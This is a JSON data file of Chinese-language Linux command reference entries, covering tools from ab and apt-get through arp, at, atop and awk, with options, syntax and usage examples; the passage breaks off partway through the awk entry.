[{"name":"ab","categoryId":0,"data":"ab\n\u003d\u003d\u003d\n\nApache服务器的性能测试工具\n\n## 补充说明\n\n**ab命令** 是Apache的Web服务器的性能测试工具，它可以测试安装Web服务器每秒种处理的HTTP请求。\n\n### 语法  \n\n```\nab(选项)(参数)\n```\n\n### 选项  \n\n```\n-A：指定连接服务器的基本的认证凭据；\n-c：指定一次向服务器发出请求数；\n-C：添加cookie；\n-g：将测试结果输出为“gnuolot”文件；\n-h：显示帮助信息；\n-H：为请求追加一个额外的头；\n-i：使用“head”请求方式；\n-k：激活HTTP中的“keepAlive”特性；\n-n：指定测试会话使用的请求数；\n-p：指定包含数据的文件；\n-q：不显示进度百分比；\n-T：使用POST数据时，设置内容类型头；\n-v：设置详细模式等级；\n-w：以HTML表格方式打印结果；\n-x：以表格方式输出时，设置表格的属性；\n-X：使用指定的代理服务器发送请求；\n-y：以表格方式输出时，设置表格属性。\n```\n\n### 参数  \n\n主机：被测试主机。\n\n\n"},{"name":"accept","categoryId":0,"data":"accept\n\u003d\u003d\u003d\n\n指示打印系统接受发往指定目标打印机的打印任务\n\n## 补充说明\n\n**accept命令** 属于CUPS套件，用于指示打印系统接受发往指定目标打印机的打印任务。\n\n### 语法  \n\n```\naccept(选项)(参数)\n```\n\n### 选项  \n\n```\n-E：当连接到服务器时强制加密；\n-U：指定连接服务器时使用的用户名；\n-h：指定连接服务器名和端口号。\n```\n\n### 参数  \n\n目标：指定目标打印机。\n\n\n"},{"name":"alias","categoryId":4,"data":"alias\n\u003d\u003d\u003d\n\n用来设置指令的别名\n\n## 补充说明\n\n**alias命令** 用来设置指令的别名。我们可以使用该命令可以将一些较长的命令进行简化。使用alias时，用户必须使用单引号`\u0027\u0027`将原来的命令引起来，防止特殊字符导致错误。\n\nalias命令的作用只局限于该次登入的操作。若要每次登入都能够使用这些命令别名，则可将相应的alias命令存放到bash的初始化文件`/etc/bashrc`中。\n\n### 语法  \n\n```\nalias(选项)(参数)\n```\n\n### 选项  \n\n```\n-p：打印已经设置的命令别名。\n```\n\n### 参数  \n\n命令别名设置：定义命令别名，格式为“命令别名\u003d‘实际命令’”。\n\n### 实例  \n\n **alias 的基本使用方法为：** \n\n```\nalias 新的命令\u003d\u0027原命令 -选项/参数\u0027\n```\n\n例如：`alias l\u003d‘ls -lsh\u0027`将重新定义ls命令，现在只需输入l就可以列目录了。直接输入 alias 命令会列出当前系统中所有已经定义的命令别名。\n\n要删除一个别名，可以使用 unalias 命令，如 unalias l。\n\n **查看系统已经设置的别名：** \n\n```\nalias -p\nalias cp\u003d\u0027cp -i\u0027\nalias l.\u003d\u0027ls -d .* --color\u003dtty\u0027\nalias ll\u003d\u0027ls -l --color\u003dtty\u0027\nalias ls\u003d\u0027ls --color\u003dtty\u0027\nalias mv\u003d\u0027mv -i\u0027\nalias rm\u003d\u0027rm -i\u0027\nalias which\u003d\u0027alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde\u0027\n```\n\n\n"},{"name":"apachectl","categoryId":9,"data":"apachectl\n\u003d\u003d\u003d\n\nApache服务器前端控制工具\n\n## 补充说明\n\n**apachectl命令** 是Apache的Web服务器前端控制工具，用以启动、关闭和重新启动Web服务器进程。\n\n### 语法  \n\n```\napachectl(参数)\n```\n\n### 参数  \n\n*   configtest：检查设置文件中的语法是否正确；\n*   fullstatus：显示服务器完整的状态信息；\n*   graceful：重新启动Apache服务器，但不会中断原有的连接；\n*   help：显示帮助信息；\n*   restart：重新启动Apache服务器；\n*   start：启动Apache服务器；\n*   status：显示服务器摘要的状态信息；\n*   stop：停止Apache服务器。\n\n\n"},{"name":"apropos","categoryId":0,"data":"apropos\n\u003d\u003d\u003d\n\n在 whatis 数据库中查找字符串\n\n## 补充说明\n\n**apropos命令** 在一些特定的包含系统命令的简短描述的数据库文件里查找关键字，然后把结果送到标准输出。 \n\n如果你不知道完成某个特定任务所需要命令的名称，可以使用一个关键字通过Linux apropos实用程序来搜索它。该实用程序可以搜索关键字并且显示所有包含匹配项的man页面的简短描述。另外，使用man实用程序和-k（关键字）选项，可以得到和用Linux apropos实用程序相同的结果（实际上是相同的命令）。\n\n### 语法  \n\n```\napropos [-dalhvV] -e|-[w|-r] [-s section] [-m system[,...]] [-M path] [-L locale] -C [file] keyword ...\n```\n\n### 选项  \n\n```\n-d, --debug：输出调试信息。\n-v, --verbose：输出详细的警告信息。\n-r, -- regex：将每个keyword作为正则表达式解释。这是默认行为。每个keyword将匹配手册页和描述。\n-w, --wildcard：将每个keyword作为shell样式的通配符解释。\n-e, --exact：每个keyword将精确匹配手册页名字和描述。\n-a, --and：只显示匹配所有keyword的手册页和描述。默认显示匹配任何keyword的项。\n-l, --long：不根据终端宽度缩减输出。\n-s section, --section section：只查找指定的手册section。\n-m system[,...], --systems\u003dsystem[,...]：用于查找其它操作系统的手册页。\n-M path, --manpath\u003dpath：指定从其它以冒号分隔的手册页层次查找。默认使用$MANPATH环境变量。这个选项覆盖$MANPATH的内容。\n-L locale, --locale\u003dlocale：apropos调用C函数setlocale来得到当前本地化信息，包括$LC_MESSAGE和$LANG。使用该选项提供一个locale字符串来临时更改本地化信息。\n-C file, --config-file\u003dfile：使用这个用户配置文件而不是默认的~/.manpath。\n-h, --help：打印帮助信息并退出。\n-V, --version：打印版本信息并退出。\n```\n\n### 返回值  \n\n返回0表示成功，1表示用法、语法或配置文件错误，2表示操作错误，16表示没有找到匹配的内容。\n\n### 实例  \n\n```\n[root@localhost ~]# man -k who\nat.allow [at]        (5)  - determine who can submit jobs via at or batch\nat.deny [at]         (5)  - determine who can submit jobs via at or batch\njwhois               (1)  - client for the whois service\njwhois              (rpm) - Internet whois/nicname client.\nNet::LDAP::Extension::whoami (3pm)  - LDAP Who am I? Operation\nw                    (1)  - Show who is logged on and what they are doing\nwho                  (1p)  - display who is on the system\nwho                  (1)  - show who is logged on\nwhoami               (1)  - print effective userid\n\n[root@localhost ~]# apropos who\nat.allow [at]        (5)  - determine who can submit jobs via at or batch\nat.deny [at]         (5)  - determine who can submit jobs via at or batch\njwhois               (1)  - client for the whois service\njwhois              (rpm) - Internet whois/nicname client.\nNet::LDAP::Extension::WhoAmI (3pm)  - LDAP Who am I? Operation\nw                    (1)  - Show who is logged on and what they are doing\nwho                  (1p)  - display who is on the system\nwho                  (1)  - show who is logged on\nwhoami               (1)  - print effective userid\n```\n\n查找手册页名字和描述中包含emacs和vi的手册页：\n\n```\napropos -a emacs vi\n```\n\n\n"},{"name":"apt-get","categoryId":0,"data":"apt-get\n\u003d\u003d\u003d\n\nDebian Linux发行版中的APT软件包管理工具\n\n## 补充说明\n\n**apt-get命令** 是Debian Linux发行版中的APT软件包管理工具。所有基于Debian的发行都使用这个包管理系统。deb包可以把一个应用的文件包在一起，大体就如同Windows上的安装文件。\n\n### 语法  \n\n```\napt-get(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：指定配置文件。\n```\n\n### 参数  \n\n*   管理指令：对APT软件包的管理操作；\n*   软件包：指定要操纵的软件包。\n\n### 实例  \n\n使用apt-get命令的第一步就是引入必需的软件库，Debian的软件库也就是所有Debian软件包的集合，它们存在互联网上的一些公共站点上。把它们的地址加入，apt-get就能搜索到我们想要的软件。/etc/apt/sources.list是存放这些地址列表的配置文件，其格式如下：\n\n```\ndeb web或[ftp地址] [发行版名字] main/contrib/non-[free]\n```\n\n我们常用的Ubuntu就是一个基于Debian的发行，我们使用apt-get命令获取这个列表，以下是我整理的常用命令：\n\n在修改`/etc/apt/sources.list`或者`/etc/apt/preferences`之后运行该命令。此外您需要定期运行这一命令以确保您的软件包列表是最新的：\n\n```\napt-get update\n```\n\n安装一个新软件包：\n\n```\napt-get install packagename\n```\n\n卸载一个已安装的软件包（保留配置文件）：\n\n```\napt-get remove packagename\n```\n\n卸载一个已安装的软件包（删除配置文件）：\n\n```\napt-get –purge remove packagename\n```\n\n会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件：\n\n```\napt-get autoclean apt\n```\n\n这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的：\n\n```\napt-get clean\n```\n\n更新所有已安装的软件包：\n\n```\napt-get upgrade\n```\n\n将系统升级到新版本：\n\n```\napt-get dist-upgrade\n```\n\n定期运行这个命令来清除那些已经卸载的软件包的.deb文件。通过这种方式，您可以释放大量的磁盘空间。如果您的需求十分迫切，可以使用`apt-get clean`以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。大多数情况下您不会再用到这些.debs文件，因此如果您为磁盘空间不足 而感到焦头烂额，这个办法也许值得一试：\n\n```\napt-get autoclean\n```\n\n\n"},{"name":"apt-key","categoryId":0,"data":"apt-key\n\u003d\u003d\u003d\n\n管理Debian Linux系统中的软件包密钥\n\n## 补充说明\n\n**apt-key命令** 用于管理Debian Linux系统中的软件包密钥。每个发布的deb包，都是通过密钥认证的，apt-key用来管理密钥。\n\n### 语法  \n\n```\napt-key(参数)\n```\n\n### 参数  \n\n操作指令：APT密钥操作指令。\n\n### 实例  \n\n```\napt-key list          #列出已保存在系统中key。\napt-key add keyname   #把下载的key添加到本地trusted数据库中。\napt-key del keyname   #从本地trusted数据库删除key。\napt-key update        #更新本地trusted数据库，删除过期没用的key。\n```\n\n\n"},{"name":"apt-sortpkgs","categoryId":0,"data":"apt-sortpkgs\n\u003d\u003d\u003d\n\nDebian Linux下对软件包索引文件进行排序的工具\n\n## 补充说明\n\n**apt-sortpkgs命令** 是Debian Linux下对软件包索引文件进行排序的简单工具。\n\n### 语法  \n\n```\napt-sortpkgs(选项)(参数)\n```\n\n### 选项  \n\n```\n-s：使用源索引字段排序；\n-h：显示帮助信息。\n```\n\n### 参数  \n\n文件：指定要排序的包含debian包信息的索引文件。\n\n\n"},{"name":"aptitude","categoryId":0,"data":"aptitude\n\u003d\u003d\u003d\n\nDebian Linux系统中软件包管理工具\n\n## 补充说明\n\n**aptitude命令** 与apt-get命令一样，都是Debian Linux及其衍生系统中功能极其强大的包管理工具。与apt-get不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。它通过文本操作菜单和命令两种方式管理软件包。\n\n### 语法  \n\n```\naptitude(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：显示帮助信息；\n-d：仅下载软件包，不执行安装操作；\n-P：每一步操作都要求确认；\n-y：所有问题都回答“yes”；\n-v：显示附加信息；\n-u：启动时下载新的软件包列表。\n```\n\n### 参数  \n\n操作命令：用户管理软件包的操作命令。\n\n### 实例  \n\n以下是我总结的一些常用aptitude命令，仅供参考：\n\n```\naptitude update            #更新可用的包列表\naptitude upgrade           #升级可用的包\naptitude dist-upgrade      #将系统升级到新的发行版\naptitude install pkgname   #安装包\naptitude remove pkgname    #删除包\naptitude purge pkgname     #删除包及其配置文件\naptitude search string     #搜索包\naptitude show pkgname      #显示包的详细信息\naptitude clean             #删除下载的包文件\naptitude autoclean         #仅删除过期的包文件\n```\n\n当然，你也可以在文本界面模式中使用 aptitude。\n\n\n"},{"name":"arch","categoryId":0,"data":"arch\n\u003d\u003d\u003d\n\n显示当前主机的硬件架构类型\n\n## 补充说明\n\n**arch命令** 用于显示当前主机的硬件架构类型。arch命令等同于`命令name -m`在当前的Linux系统下,arch命令输出结果有:i386、i486、i586、alpha、sparc、arm、m68k、mips、ppc、i686等\n\n### 语法  \n\n```\narch\n```\n\n### 实例  \n\n```\narch\nx86_64\n```\n\n\n"},{"name":"arj","categoryId":0,"data":"arj\n\u003d\u003d\u003d\n\n用于创建和管理.arj压缩包\n\n## 补充说明\n\n**arj命令** 是“.arj”格式的压缩文件的管理器，用于创建和管理“.arj”压缩包。\n\n### 语法  \n\n```\narj(参数)\n```\n\n### 参数  \n\n*   操作指令：对“.arj”压缩包执行的操作指令；\n*   压缩包名称：指定要操作的arj压缩包名称。\n\n\n"},{"name":"arp","categoryId":0,"data":"arp\n\u003d\u003d\u003d\n\n显示和修改IP到MAC转换表\n\n## 补充说明\n\n**arp命令** 用于操作主机的arp缓冲区，它可以显示arp缓冲区中的所有条目、删除指定的条目或者添加静态的ip地址与MAC地址对应关系。\n\n### 语法  \n\n```\narp(选项)(参数)\n```\n\n### 选项  \n\n```\n-a\u003c主机\u003e：显示arp缓冲区的所有条目；\n-H\u003c地址类型\u003e：指定arp指令使用的地址类型；\n-d\u003c主机\u003e：从arp缓冲区中删除指定主机的arp条目；\n-D：使用指定接口的硬件地址；\n-e：以Linux的显示风格显示arp缓冲区中的条目；\n-i\u003c接口\u003e：指定要操作arp缓冲区的网络接口；\n-s\u003c主机\u003e\u003cMAC地址\u003e：设置指定的主机的IP地址与MAC地址的静态映射；\n-n：以数字方式显示arp缓冲区中的条目；\n-v：显示详细的arp缓冲区条目，包括缓冲区条目的统计信息；\n-f\u003c文件\u003e：设置主机的IP地址与MAC地址的静态映射。\n```\n\n### 参数  \n\n主机：查询arp缓冲区中指定主机的arp条目。\n\n### 实例  \n\n```\n[root@localhost ~]# arp -v\nAddress                  HWtype  HWaddress           Flags Mask            Iface\n192.168.0.134            ether   00:21:5E:C7:4D:88   C                     eth1\n115.238.144.129          ether   38:22:D6:2F:B2:F1   C                     eth0\nEntries: 2      Skipped: 0      Found: 2\n```\n\n\n"},{"name":"arpd","categoryId":0,"data":"arpd\n\u003d\u003d\u003d\n\n收集免费ARP信息\n\n## 补充说明\n\n**arpd命令** 是用来收集免费arp信息的一个守护进程，它将收集到的信息保存在磁盘上或者在需要时，提供给内核用户用于避免多余广播。\n\n### 语法  \n\n```\narpd(选项)(参数)\n```\n\n### 选项  \n\n```\n-l：将arp数据库输出到标准输出设备显示并退出；\n-f：指定读取和加载arpd数据库的文本文件，文件的格式与“-l”输出信息类似；\n-b：指定arpd数据库文件，默认的位置为“/var/lib/arpd.db”；\n-a：指定目标被认为死掉前查询的次数；\n-k：禁止通过内核发送广播查询；\n-n：设定缓冲失效时间。\n```\n\n### 参数  \n\n网络接口：指定网络接口。\n\n### 实例  \n\n启动arpd进程：\n\n```\narpd -b /var/tmp/arpd.db\n```\n\n运行一段时间后，查看结果：\n\n```\narpd -l -b /var/tmp/arpd.db\n```\n\n\n"},{"name":"arping","categoryId":0,"data":"arping\n\u003d\u003d\u003d\n\n通过发送ARP协议报文测试网络\n\n## 补充说明\n\n**arping命令** 是用于发送arp请求到一个相邻主机的工具，arping使用arp数据包，通过ping命令检查设备上的硬件地址。能够测试一个ip地址是否是在网络上已经被使用，并能够获取更多设备信息。功能类似于ping。\n\n### 语法  \n\n```\narping(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：用于发送以太网广播帧（FFFFFFFFFFFF）。arping一开始使用广播地址，在收到响应后就使用unicast地址。\n-q：quiet output不显示任何信息；\n-f：表示在收到第一个响应报文后就退出；\n-w timeout：设定一个超时时间，单位是秒。如果到了指定时间，arping还没到完全收到响应则退出；\n-c count：表示发送指定数量的ARP请求数据包后就停止。如果指定了deadline选项，则arping会等待相同数量的arp响应包，直到超时为止；\n-s source：设定arping发送的arp数据包中的SPA字段的值。如果为空，则按下面处理，如果是DAD模式（冲突地址探测），则设置为0.0.0.0，如果是Unsolicited ARP模式（Gratutious ARP）则设置为目标地址，否则从路由表得出；\n-I interface：设置ping使用的网络接口。\n```\n\n### 参数  \n\n目的主机：指定发送ARP报文的目的主机。\n\n### 实例  \n\n```\n[root@localhost ~]# arping www.baidu.com \nARPING 220.181.111.147 from 173.231.43.132 eth0\nUnicast reply from 220.181.111.147 00:D0:03:[bc:48:00]  1.666ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.677ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.691ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.728ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.626ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.292ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.429ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  2.042ms\nSent 8 probes (1 broadcast(s))\nReceived 8 response(s)\n```\n\n\n"},{"name":"arptables","categoryId":0,"data":"arptables\n\u003d\u003d\u003d\n\n管理ARP包过滤规则表\n\n## 补充说明\n\n**arptables命令** 用来设置、维护和检查Linux内核中的arp包过滤规则表。\n\n### 语法  \n\n```\narptables(选项)\n```\n\n### 选项  \n\n```\n-A：向规则链中追加规则；\n-D：从指定的链中删除规则；\n-l：向规则链中插入一条新的规则；\n-R：替换指定规则；\n-P：设置规则链的默认策略；\n-F：刷新指定规则链，将其中的所有规则链删除，但是不改变规则链的默认策略；\n-Z：将规则链计数器清零；\n-L：显示规则链中的规则列表；\n-X：删除指定的空用户自定义规则链；\n-h：显示指令帮助信息；\n-j：指定满足规则的添加时的目标；\n-s：指定要匹配ARP包的源ip地址；\n-d：指定要匹配ARP包的目的IP地址。\n```\n\n\n"},{"name":"arpwatch","categoryId":9,"data":"arpwatch\n\u003d\u003d\u003d\n\n监听网络上ARP的记录\n\n## 补充说明\n\n**arpwatch命令** 用来监听网络上arp的记录。\n\n### 语法  \n\n```\narpwatch(选项)\n```\n\n### 选项  \n\n```\n-d：启动排错模式；\n-f\u003c记录文件\u003e：设置存储ARP记录的文件，预设为/var/arpwatch/arp.dat；\n-i\u003c接口\u003e：指定监听ARP的接口，预设的接口为eth0；\n-r\u003c记录文件\u003e：从指定的文件中读取ARP记录，而不是从网络上监听。\n```\n\n\n"},{"name":"as","categoryId":0,"data":"as\n\u003d\u003d\u003d\n\n汇编语言编译器\n\n## 补充说明\n\n**as命令** GNU组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。\n\n### 语法  \n\n```\nas(选项)(参数)\n```\n\n### 选项  \n\n```\n-ac：忽略失败条件；\n-ad：忽略调试指令；\n-ah：包括高级源；\n-al：包括装配；\n-am：包括宏扩展；\n-an：忽略形式处理；\n-as：包括符号；\n\u003dfile：设置列出文件的名字；\n--alternate：以交互宏模式开始；\n-f：跳过空白和注释预处理；\n-g：产生调试信息；\n-J：对于有符号溢出不显示警告信息；\n-L：在符号表中保留本地符号；\n-o：指定要生成的目标文件；\n--statistics：打印汇编所用的最大空间和总时间。\n```\n\n### 参数  \n\n汇编文件：指定要汇编的源文件。\n\n\n"},{"name":"at","categoryId":0,"data":"at\n\u003d\u003d\u003d\n\n在指定时间执行一个任务\n\n## 补充说明\n\n**at命令** 用于在指定时间执行命令。at允许使用一套相当复杂的指定时间的方法。它能够接受在当天的hh:mm（小时:分钟）式的时间指定。假如该时间已过去，那么就放在第二天执行。当然也能够使用midnight（深夜），noon（中午），teatime（饮茶时间，一般是下午4点）等比较模糊的 词语来指定时间。用户还能够采用12小时计时制，即在时间后面加上AM（上午）或PM（下午）来说明是上午还是下午。 也能够指定命令执行的具体日期，指定格式为month day（月 日）或mm/dd/yy（月/日/年）或dd.mm.yy（日.月.年）。指定的日期必须跟在指定时间的后面。\n\n上面介绍的都是绝对计时法，其实还能够使用相对计时法，这对于安排不久就要执行的命令是很有好处的。指定格式为：`now + count time-units`，now就是当前时间，time-units是时间单位，这里能够是minutes（分钟）、hours（小时）、days（天）、weeks（星期）。count是时间的数量，究竟是几天，还是几小时，等等。 更有一种计时方法就是直接使用today（今天）、tomorrow（明天）来指定完成命令的时间。\n\n### 语法  \n\n```\nat(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：指定包含具体指令的任务文件；\n-q：指定新任务的队列名称；\n-l：显示待执行任务的列表；\n-d：删除指定的待执行任务；\n-m：任务执行完成后向用户发送E-mail。\n```\n\n### 参数  \n\n日期时间：指定任务执行的日期时间。\n\n### 实例  \n\n三天后的下午 5 点锺执行`/bin/ls`：\n\n```\n[root@localhost ~]# at 5pm+3 days\nat\u003e /bin/ls\nat\u003e \u003cEOT\u003e\njob 7 at 2013-01-08 17:00\n```\n\n明天17点钟，输出时间到指定文件内：\n\n```\n[root@localhost ~]# at 17:20 tomorrow\nat\u003e date \u003e/root/2013.log\nat\u003e \u003cEOT\u003e\njob 8 at 2013-01-06 17:20\n```\n\n计划任务设定后，在没有执行之前我们可以用atq命令来查看系统没有执行工作任务：\n\n```\n[root@localhost ~]# atq\n8       2013-01-06 17:20 a root\n7       2013-01-08 17:00 a root\n```\n\n删除已经设置的任务：\n\n```\n[root@localhost ~]# atq\n8       2013-01-06 17:20 a root\n7       2013-01-08 17:00 a root\n\n[root@localhost ~]# atrm 7\n[root@localhost ~]# atq\n8       2013-01-06 17:20 a root\n```\n\n显示已经设置的任务内容：\n\n```\n[root@localhost ~]# at -c 8\n#!/bin/sh\n# atrun uid\u003d0 gid\u003d0\n# mail     root 0\numask 22此处省略n个字符\ndate \u003e/root/2013.log\n```\n\n\n"},{"name":"atop","categoryId":0,"data":"atop\n\u003d\u003d\u003d\n\n监控Linux系统资源与进程的工具\n\n## 补充说明\n\n[非内部程序，需要安装]它以一定的频率记录系统的运行状态，所采集的数据包含系统资源(CPU、内存、磁盘和网络)使用情况和进程运行情况，并能以日志文件的方式保存在磁盘中，服务器出现问题后，我们可获取相应的atop日志文件进行分析。atop是一款开源软件，我们可以从这里获得其源码和rpm安装包。\n\n## 语法  \n\n```\natop(选项)(参数)\n```\n\n## 说明  \n\n**ATOP列**：该列显示了主机名、信息采样日期和时间点\n\n**PRC列**：该列显示进程整体运行情况\n\n- sys、usr字段分别指示进程在内核态和用户态的运行时间\n- #proc字段指示进程总数\n- #zombie字段指示僵死进程的数量\n- #exit字段指示atop采样周期期间退出的进程数量\n\n\n**CPU列**：该列显示CPU整体(即多核CPU作为一个整体CPU资源)的使用情况，我们知道CPU可被用于执行进程、处理中断，也可处于空闲状态(空闲状态分两种，一种是活动进程等待磁盘IO导致CPU空闲，另一种是完全空闲)\n\n- sys、usr字段指示CPU被用于处理进程时，进程在内核态、用户态所占CPU的时间比例\n- irq字段指示CPU被用于处理中断的时间比例\n- idle字段指示CPU处在完全空闲状态的时间比例\n- wait字段指示CPU处在“进程等待磁盘IO导致CPU空闲”状态的时间比例\n\nCPU列各个字段指示值相加结果为N00%，其中N为cpu核数。\n\ncpu列：该列显示某一核cpu的使用情况，各字段含义可参照CPU列，各字段值相加结果为100%\n\n**CPL列**：该列显示CPU负载情况\n\n- avg1、avg5和avg15字段：过去1分钟、5分钟和15分钟内运行队列中的平均进程数量\n- csw字段指示上下文交换次数\n- intr字段指示中断发生次数\n\n**MEM列**：该列指示内存的使用情况\n\n- tot字段指示物理内存总量\n- free字段指示空闲内存的大小\n- cache字段指示用于页缓存的内存大小\n- buff字段指示用于文件缓存的内存大小\n- slab字段指示系统内核占用的内存大小\n\n**SWP列**：该列指示交换空间的使用情况\n\n- tot字段指示交换区总量\n- free字段指示空闲交换空间大小\n\n**PAG列**：该列指示虚拟内存分页情况\n\nswin、swout字段：换入和换出内存页数\n\n**DSK列**：该列指示磁盘使用情况，每一个磁盘设备对应一列，如果有sdb设备，那么增多一列DSK信息\n\n- sda字段：磁盘设备标识\n- busy字段：磁盘忙时比例\n- read、write字段：读、写请求数量\n\n**NET列**：多列NET展示了网络状况，包括传输层(TCP和UDP)、IP层以及各活动的网口信息\n\n- XXXi  字段指示各层或活动网口收包数目\n- XXXo 字段指示各层或活动网口发包数目\n\n\n## atop日志\n\n每个时间点采样页面组合起来就形成了一个atop日志文件，我们可以使用\"atop -r XXX\"命令对日志文件进行查看。那以什么形式保存atop日志文件呢？\n\n对于atop日志文件的保存方式，我们可以这样：\n\n- 每天保存一个atop日志文件，该日志文件记录当天信息\n- 日志文件以\"atop_YYYYMMDD\"的方式命名\n- 设定日志失效期限，自动删除一段时间前的日志文件\n\n其实atop开发者已经提供了以上日志保存方式，相应的atop.daily脚本可以在源码目录下找到。在atop.daily脚本中，我们可以通过修改INTERVAL变量改变atop信息采样周期(默认为10分钟)；通过修改以下命令中的数值改变日志保存天数(默认为28天)：\n\n```\n(sleep 3; find $LOGPATH -name \u0027atop_*\u0027 -mtime +28 -exec rm {} \\; )\u0026 \n```\n\n最后，我们修改cron文件，每天凌晨执行atop.daily脚本：\n\n```\n0 0 * * * root /etc/cron.daily/atop.daily\n```\n\n## 相关资料\n\n- [官方手册](http://www.atoptool.nl/download/man_atop-1.pdf)\n\n"},{"name":"atq","categoryId":0,"data":"atq\n\u003d\u003d\u003d\n\n列出当前用户的at任务列表\n\n## 补充说明\n\n**atq命令** 显示系统中待执行的任务列表，也就是列出当前用户的at任务列表。\n\n### 语法  \n\n```\natq(选项)\n```\n\n### 选项  \n\n```\n-V：显示版本号；\n-q：查询指定队列的任务。\n```\n\n### 实例  \n\n```\nat now + 10 minutes\nat\u003e echo 1111\nat\u003e \u003ceot\u003e\njob 3 at Fri Apr 26 12:56:00 2013\n\natq\n3       Fri Apr 26 12:56:00 2013 a root\n```\n\n\n"},{"name":"atrm","categoryId":0,"data":"atrm\n\u003d\u003d\u003d\n\n删除待执行任务队列中的指定任务\n\n## 补充说明\n\n**atrm命令** 用于删除待执行任务队列中的指定任务。\n\n### 语法  \n\n```\natrm(选项)(参数)\n```\n\n### 选项  \n\n```\n-V：显示版本号。\n```\n\n### 参数  \n\n任务号：指定待执行队列中要删除的任务。\n\n### 实例  \n\n删除已经排队的任务\n\n```\natq        //显示当前已经设置的任务\n2 Mon May 17 08:00:00 2010 a root\n1 Sat May 15 17:00:00 2010 a root\n\natrm 2     //删除任务2\n```\n\n\n"},{"name":"awk","categoryId":1,"data":"awk\n\u003d\u003d\u003d\n\n文本和数据进行处理的编程语言\n\n## 补充说明\n\n**awk** 是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。\n\n## awk命令格式和选项  \n\n **语法形式** \n\n```\nawk [options] \u0027script\u0027 var\u003dvalue file(s)\nawk [options] -f scriptfile var\u003dvalue file(s)\n```\n\n **常用命令选项** \n\n*    **-F fs   ** fs指定输入分隔符，fs可以是字符串或正则表达式，如-F:\n*    **-v var\u003dvalue   ** 赋值一个用户定义变量，将外部变量传递给awk\n*    **-f scripfile  ** 从脚本文件中读取awk命令\n*    **-m[fr] val   ** 对val值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。\n\n## awk模式和操作  \n\nawk脚本是由模式和操作组成的。\n\n### 模式  \n\n模式可以是以下任意一个：\n\n*   /正则表达式/：使用通配符的扩展集。\n*   关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试。\n*   模式匹配表达式：用运算符`~`（匹配）和`~!`（不匹配）。\n*   BEGIN语句块、pattern语句块、END语句块：参见awk的工作原理\n\n### 操作  \n\n操作由一个或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内，主要部分是：\n\n*   变量或数组赋值\n*   输出命令\n*   内置函数\n*   控制流语句\n\n## awk脚本基本结构  \n\n```\nawk \u0027BEGIN{ print \"start\" } pattern{ commands } END{ print \"end\" }\u0027 file\n```\n\n一个awk脚本通常由：BEGIN语句块、能够使用模式匹配的通用语句块、END语句块3部分组成，这三个部分是可选的。任意一个部分都可以不出现在脚本中，脚本通常是被 **单引号** 或 **双引号** 中，例如：\n\n```\nawk \u0027BEGIN{ i\u003d0 } { i++ } END{ print i }\u0027 filename\nawk \"BEGIN{ i\u003d0 } { i++ } END{ print i }\" filename\n```\n\n### awk的工作原理  \n\n```\nawk \u0027BEGIN{ commands } pattern{ commands } END{ commands }\u0027\n```\n\n*   第一步：执行`BEGIN{ commands }`语句块中的语句；\n*   第二步：从文件或标准输入(stdin)读取一行，然后执行`pattern{ commands }`语句块，它逐行扫描文件，从第一行到最后一行重复这个过程，直到文件全部被读取完毕。\n*   第三步：当读至输入流末尾时，执行`END{ commands }`语句块。\n\n **BEGIN语句块** 在awk开始从输入流中读取行 **之前** 被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在BEGIN语句块中。\n\n **END语句块** 在awk从输入流中读取完所有的行 **之后** 即被执行，比如打印所有行的分析结果这类信息汇总都是在END语句块中完成，它也是一个可选语句块。\n\n **pattern语句块** 中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，则默认执行`{ print }`，即打印每一个读取到的行，awk读取的每一行都会执行该语句块。\n\n **示例** \n\n```\necho -e \"A line 1nA line 2\" | awk \u0027BEGIN{ print \"Start\" } { print } END{ print \"End\" }\u0027\nStart\nA line 1\nA line 2\nEnd\n```\n\n当使用不带参数的`print`时，它就打印当前行，当`print`的参数是以逗号进行分隔时，打印时则以空格作为定界符。在awk的print语句块中双引号是被当作拼接符使用，例如：\n\n```\necho | awk \u0027{ var1\u003d\"v1\"; var2\u003d\"v2\"; var3\u003d\"v3\"; print var1,var2,var3; }\u0027 \nv1 v2 v3\n```\n\n双引号拼接使用：\n\n```\necho | awk \u0027{ var1\u003d\"v1\"; var2\u003d\"v2\"; var3\u003d\"v3\"; print var1\"\u003d\"var2\"\u003d\"var3; }\u0027\nv1\u003dv2\u003dv3\n```\n\n{ }类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i\u003d0）以及打印文件头部的语句放入BEGIN语句块中，将打印的结果等语句放在END语句块中。\n\n## awk内置变量（预定义变量）  \n\n说明：[A][N][P][G]表示第一个支持变量的工具，[A]\u003dawk、[N]\u003dnawk、[P]\u003dPOSIXawk、[G]\u003dgawk\n\n```\n **$n**  